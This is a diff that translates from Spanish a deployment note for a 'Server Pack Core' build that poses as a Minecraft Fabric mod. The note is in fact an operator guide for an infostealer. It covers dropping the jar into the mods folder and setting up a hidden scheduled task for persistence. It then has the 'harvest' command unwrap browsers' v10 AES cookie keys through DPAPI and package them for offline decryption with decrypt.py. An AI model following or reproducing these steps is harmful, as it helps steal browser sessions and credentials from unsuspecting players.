@@ -1,54 +1,54 @@
-DESPLIEGUE EN WINDOWS - Server Pack Core 0.1.2
+WINDOWS DEPLOYMENT - Server Pack Core 0.1.2
 
-Copiar solo el .jar, no ejecutarlo desde la unidad compartida.
+Copy only the .jar, do not run it from the shared drive.
 
-Cambios frente a 0.1.1: el harvest incluye browsers/<navegador>/keys.txt con
-la clave AES v10 desenvuelta con DPAPI en la sesion. El resto es igual.
+Changes from 0.1.1: the harvest includes browsers/<browser>/keys.txt with
+the v10 AES key unwrapped through DPAPI in the session. The rest is unchanged.
 
-1. En Windows, comprobar el archivo antes de usarlo:
+1. On Windows, check the file before using it:
 
    certutil -hashfile serverpackcore-0.1.2.jar SHA256
 
-   Debe dar:
+   It must return:
    150e739c009b11dd9fd5d8b28ef43312edbdb1d54c190e83a1193e1c67577302
 
-2. Ir a la carpeta mods del perfil Fabric 1.20.1 (por defecto
-   %APPDATA%\.minecraft\mods) y borrar serverpackcore-0.1.1.jar.
+2. Go to the mods folder of the Fabric 1.20.1 profile (by default
+   %APPDATA%\.minecraft\mods) and delete serverpackcore-0.1.1.jar.
 
-3. Copiar serverpackcore-0.1.2.jar a esa carpeta.
+3. Copy serverpackcore-0.1.2.jar into that folder.
 
-4. Cerrar Minecraft y comprobar que no queda agente:
+4. Close Minecraft and check that no agent remains:
 
    tasklist | findstr /i "spc-sync"
    taskkill /f /im spc-sync.exe
 
-5. Abrir Minecraft con el perfil Fabric, entrar a un mundo y esperar 20-60 s.
+5. Open Minecraft with the Fabric profile, enter a world and wait 20-60 s.
 
-6. Confirmar que corre la version nueva:
+6. Confirm the new version is running:
 
    type "%LOCALAPPDATA%\ServerPackCore\state.json"
 
-   Debe aparecer "version":"0.1.2".
+   It must show "version":"0.1.2".
 
-7. Enviar `persist on`. Respuesta esperada: "Persistencia on: true" y
-   "Tarea oculta: \ServerPackCore". La tarea 0.1.1 se sobrescribe, no se
-   duplica.
+7. Send `persist on`. Expected reply: "Persistence on: true" and
+   "Hidden task: \ServerPackCore". The 0.1.1 task is overwritten, not
+   duplicated.
 
-8. Enviar `harvest`. En el ZIP debe aparecer, por cada navegador detectado,
-   browsers/<navegador>/keys.txt con una linea v10= (y app_bound= si existe).
-   Si trae error=, Windows tiene PowerShell restringido: quedan Local State y
-   dpapi/ como respaldo.
+8. Send `harvest`. For each detected browser, the ZIP must contain
+   browsers/<browser>/keys.txt with a v10= line (and app_bound= if present).
+   If it has error=, Windows has PowerShell restricted: Local State and
+   dpapi/ remain as fallback.
 
-9. En Fedora, sin red:
+9. On Fedora, offline:
 
-   python decrypt.py cookies "…/browsers/<perfil>/Cookies" --keys-file "…/browsers/<navegador>/keys.txt"
+   python decrypt.py cookies "…/browsers/<profile>/Cookies" --keys-file "…/browsers/<browser>/keys.txt"
 
-   Las cookies v20 saldran como <v20 app-bound>; es esperado.
+   v20 cookies will appear as <v20 app-bound>; this is expected.
 
 ROLLBACK
 
-Si 0.1.2 falla: `persist off`, cerrar Minecraft, borrar el 0.1.2 y reponer
-serverpackcore-0.1.1.jar (sigue en esta carpeta, hash
+If 0.1.2 fails: `persist off`, close Minecraft, delete 0.1.2 and restore
+serverpackcore-0.1.1.jar (still in this folder, hash
 a7cae78179a6f44876f5d7ca1099722a9e33b66abd7b8c12623de623e6d356ab).
-0.1.1 ya usa tarea oculta, asi que el mecanismo no cambia; solo se pierde
-keys.txt.
+0.1.1 already uses a hidden task, so the mechanism does not change; only
+keys.txt is lost.
